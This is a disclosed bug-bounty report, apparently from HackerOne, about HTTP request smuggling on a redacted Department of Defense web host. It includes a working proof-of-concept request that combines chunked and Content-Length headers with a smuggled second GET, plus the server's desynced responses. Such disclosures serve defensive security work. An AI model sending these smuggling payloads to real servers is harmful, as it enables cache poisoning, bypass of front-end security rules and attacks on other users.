---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-request-smuggling
  - env/web
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2021-04-20
submitted: 2021-03-09T03:24:12.249Z
bounty_usd: null
votes: 40
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "lu3ky-13"
source: "https://hackerone.com/reports/1120982"
title: "HTTP Request Smuggling "
---
# HTTP Request Smuggling 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 40 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-04-20

- Report: [https://hackerone.com/reports/1120982](https://hackerone.com/reports/1120982)
- CWE: HTTP Request Smuggling
- Submitted: 2021-03-09T03:24:12.249Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

hello dear support 
I have found HTTP Request Smuggling on www.████████

Issue description
==============

HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
http request
============
```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0

GET https://www.███████/███ HTTP/1.1
Host: www.█████████
foo: x
```

http response 
===============
```
HTTP/1.1 302 Found
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ███=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Location: https://www.████/404_not_found.html
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://www.████████/404_not_found.html">here</a>.</p>
</body></html>
HTTP/1.1 200 OK
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ████████=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Cache-Control: no-cache, private
Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT
ETag: "78d0-4ba81a7e20e40"
Accept-Ranges: bytes
Content-Length: 30928
Content-Type: image/png

PNG


```

██████
██████████

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2021-04-13** @agent-l8: @lu3ky-13 -disclosure added to queue. We do not offer swag at this time from the VDP unless you win the researcher of the year (all 12 researchers who were selected for researcher of the month are eligible).
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
